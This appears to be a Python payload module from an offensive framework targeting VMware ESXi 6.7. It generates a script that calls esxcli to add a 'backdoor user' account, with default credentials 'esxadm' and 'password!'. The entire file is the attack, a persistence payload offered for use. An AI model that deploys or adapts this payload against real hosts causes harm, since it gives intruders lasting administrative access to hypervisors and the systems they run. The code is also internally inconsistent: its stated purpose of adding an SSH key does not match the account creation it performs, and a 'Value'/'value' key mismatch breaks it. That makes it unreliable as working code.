class Payload:

    def __init__(self):

        self.info = {
            'name': 'esx-add-ssh-key',
            'description': 'Add an ssh key to authorized keys. Check sshd FipsMode for key type restrictions.',
            'date': '2021-12-12',
            'author': 'PSMTHS',
            'compatibility': 'ESXi 6.7 EP 15'
        }

        self.options = {
            'username': {
                'required': True,
                'info': 'Username for backdoor user',
                'defaults': 'esxadm',
                'value': ''
            },
            'userrealname': {
                'required': True,
                'info': 'User real name for backdoor user',
                'defaults': 'ESX Admin',
                'value': ''
            },
            'password': {
                'required': True,
                'info': 'Password for backdoor user',
                'defaults': 'password!',
                'value': ''
            }
        }

        # Set payload options to defaults
        for option, value in self.options.items():
            value['value'] = value['defaults']

    def gen_payload(self):

        userrealname = self.options['userrealname']['Value']
        username = self.options['username']['Value']
        password = self.options['password']['Value']

        payload_script = """
import os
os.system('esxcli system account add -d %(userrealname)s -i %(username)s -p %(password)s -c %(password)s')
        """ % {'userrealname': userrealname, 'username': username, 'password': password}

        return payload_script